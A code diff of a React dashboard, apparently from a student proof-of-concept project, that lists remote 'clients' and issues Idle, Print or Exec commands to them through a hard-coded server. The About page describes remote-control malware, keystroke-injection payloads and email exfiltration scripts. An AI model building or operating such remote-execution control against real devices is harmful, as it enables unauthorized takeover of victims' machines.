@@ -1,17 +1,28 @@
 import './App.scss';
 import {useEffect, useState} from "react";
 import Select from 'react-select'
+import logo from './logo.png'
+import {
+  BrowserRouter as Router,
+  Route,
+  Link,
+  Routes
+} from "react-router-dom";
 
-const ip = "http://10.21.205.159:8080";
+const ip = "http://99.234.241.15:6969";
 
 const Navbar = () => {
   return (
     <div className={"navbar"}>
       <div className={"nav-left"}>
+        <img src={logo} alt={"Logo"}/>
         <h3>Not Hackers</h3>
       </div>
       <div className={"nav-fill"}/>
-      <div className={"nav-right"}></div>
+      <div className={"nav-right"}>
+        <Link to="/" style={{padding: '5px'}}>Dashboard</Link>
+        <Link to="/about" style={{padding: '5px'}}>About Us</Link>
+      </div>
     </div>
   )
 }
@@ -46,7 +57,9 @@ const Client = ({data, onClick}) => {
   );
 }
 
-const ClientList = ({clients, onClick}) => {
+const ClientList = ({
+                      clients, onClick
+                    }) => {
   return <div className={"clientList"}>
     <table>
       <tr>
@@ -64,7 +77,9 @@ const ClientList = ({clients, onClick}) => {
 
 }
 
-const ClientSelect = ({clients, currentClient, onChange}) => {
+const ClientSelect = ({
+                        clients, currentClient, onChange
+                      }) => {
   return (
     <Select className={"selector-container"} classNamePrefix={"selector"}
             options={clients.map((data) => {
@@ -83,7 +98,9 @@ const ClientSelect = ({clients, currentClient, onChange}) => {
   );
 }
 
-const StateEditor = ({state, value, onChange}) => {
+const StateEditor = ({
+                       state, value, onChange
+                     }) => {
   switch (state) {
     case 1:
     case 2: {
@@ -109,7 +126,7 @@ function fetchClients() {
       if (data === null) return [];
       return data.map(d => {
         return {
-          "id": d.id,
+          "id": d.id.substr(1, d.id.length - 2),
           "last_ping": d.data.time,
           "os": d.data.os
         };
@@ -137,7 +154,7 @@ function sendTo(new_state, client, data) {
     });
 }
 
-function App() {
+function Dashboard() {
   const [clients, setClients] = useState([]);
   const [currentState, setCurrentState] = useState(0);
   const [currentClient, setCurrentClient] = useState({});
@@ -166,11 +183,79 @@ function App() {
           {value: 0, label: 'Idle'},
           {value: 1, label: 'Print'},
           {value: 2, label: 'Exec'},
-        ]} onChange={state => setCurrentState(state["value"])} value={currentState}/>
+        ]} onChange={state => {
+          setCurrentState(state["value"])
+          console.log(currentState)
+        }} value={currentState}/>
         <StateEditor state={currentState} value={currentData} onChange={d => setCurrentData(d)}/>
       </div>
     </div>
   );
+}
+
+function About() {
+  return (
+    <div className={'content'}>
+      <Navbar/>
+      <h1>About us</h1>
+      <div>
+        <h3>Christian LaForest</h3>
+        <h5>Security Exploitation Expert</h5>
+        <ul>
+          <li>Developed the ROT (Remote Operating Toaster) program</li>
+          <ul>
+            <li>MacOS and Linux compatibility</li>
+            <li>Hosted from a personal server</li>
+            <li>Allows for remote control of client devices</li>
+          </ul>
+          <li>Created the user-interface site</li>
+          <ul>
+            <li>Implementing CSS and React JS</li>
+          </ul>
+          <li>General debugging and providing expertise</li>
+          <li>Documentation</li>
+
+        </ul>
+      </div>
+      <div>
+        <h3>Kabir Guron</h3>
+        <h5>Security Exploitation Expert</h5>
+        <ul>
+          <li>Constructed the hardware for Arduino Leonardo (Remote IT)</li>
+          <li>Created keybind-based Arduino scripts</li>
+          <ul>
+            <li>Ability to upload any program into TEMP directory</li>
+            <li>Light-activated script</li>
+            <li>Manual Rick-Roll</li>
+            <li>Payload injection</li>
+          </ul>
+          <li>Created two python scripts: “Control and Email” and “Audio and Email”</li>
+          <li>Documentation</li>
+        </ul>
+      </div>
+      <h1>Team Rules</h1>
+      <ul>
+        <li><b>Remain ethical</b> despite the nature of the program.</li>
+        <ul>
+          <li>Only create programs as a proof of concept or for useful/good purposes.</li>
+        </ul>
+        <li>Try to help each other with debugging when appropriate.</li>
+        <li>Try to understand perspective and respect ideas. Criticism is perfectly acceptable.</li>
+        <li>Meet deadlines well ahead of time.</li>
+      </ul>
+    </div>
+  )
+}
+
+function App() {
+  return (
+    <Router>
+      <Routes>
+        <Route path="/about" element={<About/>}/>
+        <Route path="/" element={<Dashboard/>}/>
+      </Routes>
+    </Router>
+  )
 }
 
 export default App;
